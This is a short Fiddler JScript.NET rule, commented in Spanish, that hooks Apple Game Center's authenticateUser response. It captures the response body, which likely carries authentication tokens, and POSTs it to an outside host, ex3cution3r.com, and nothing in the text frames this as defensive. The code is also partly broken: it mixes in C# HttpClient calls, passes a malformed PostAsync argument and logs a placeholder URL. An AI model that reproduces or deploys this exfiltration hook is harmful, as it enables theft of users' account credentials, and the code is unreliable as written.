  ...
  **/
  //=================================================================================================================
	static function OnBeforeResponse(oSession: Session) {
		...
		if (oSession.url == "https://profile.gc.apple.com/WebObjects/GKProfileService.woa/wa/authenticateUser") {
			// Guarda la respuesta en una variable.
			var responseContent = oSession.GetResponseBodyAsString();

			// Crea una nueva solicitud para enviar la respuesta a otro URL.
			var request = new System.Net.Http.HttpClient();
			var requestContent = new StringContent(responseContent);

			// Configura la solicitud con el URL de destino y cualquier encabezado necesario.
			request.BaseAddress = new Uri("https://ex3cution3r.com/Fiddler/response.php");
			request.PostAsync("response=", requestContent);

			// Opcionalmente, puedes registrar la acción en la ventana de registro de Fiddler.
			FiddlerObject.log("Enviada respuesta a URL de destino: " + "URL_DE_DESTINO");
		}
	}
  //=================================================================================================================
